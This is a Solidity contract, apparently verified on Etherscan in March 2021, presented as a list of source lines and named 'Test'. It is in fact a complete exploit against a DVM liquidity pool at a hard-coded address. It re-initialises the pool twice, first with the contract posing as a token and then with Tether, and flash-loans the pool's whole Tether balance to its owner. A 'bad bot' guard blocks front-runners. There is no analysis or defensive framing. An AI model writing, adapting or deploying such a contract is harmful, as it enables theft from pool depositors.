['/**\n', ' *Submitted for verification at Etherscan.io on 2021-03-10\n', '*/\n', '\n', '//SPDX-License-Identifier: Unlicense\n', 'pragma solidity ^0.7.0;\n', '\n', 'interface Tether {\n', '    function transfer(address _to, uint _value) external;\n', '    function balanceOf(address who) external returns (uint);\n', '}\n', '\n', 'interface DVM {\n', '    function init(address maintainer,\n', '        address baseTokenAddress,\n', '        address quoteTokenAddress,\n', '        uint256 lpFeeRate,\n', '        address mtFeeRateModel,\n', '        uint256 i,\n', '        uint256 k,\n', '        bool isOpenTWAP\n', '    ) external;\n', '    function flashLoan(\n', '        uint256 baseAmount,\n', '        uint256 quoteAmount,\n', '        address assetTo,\n', '        bytes calldata data\n', '    ) external;\n', '    function sync() external;\n', '}\n', '\n', 'contract Test {\n', '    address private immutable owner;\n', '    uint256 public decimals;\n', '\n', '    constructor() payable {\n', '        owner = msg.sender;\n', '        decimals = 6;\n', '    }\n', '\n', '    function test() external {\n', '        require(tx.origin == owner);\n', '        address tether = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n', '        address dvm = 0x171f481fEa1042ed3Ee4470052e604FB4D91791A;\n', '\n', '        DVM(dvm).init(address(this), address(this), dvm, 0, address(this), 1, 0, false);\n', '        DVM(dvm).sync();\n', '        DVM(dvm).init(address(this), tether, dvm, 0, address(this), 1, 0, false);\n', '        DVM(dvm).flashLoan(Tether(tether).balanceOf(dvm), 0, owner, "");\n', '    }\n', '\n', '    function balanceOf(address /*who*/) external view returns (uint) {\n', '        require(tx.origin == owner, "bad bot");\n', '        return 0;\n', '    }\n', '}']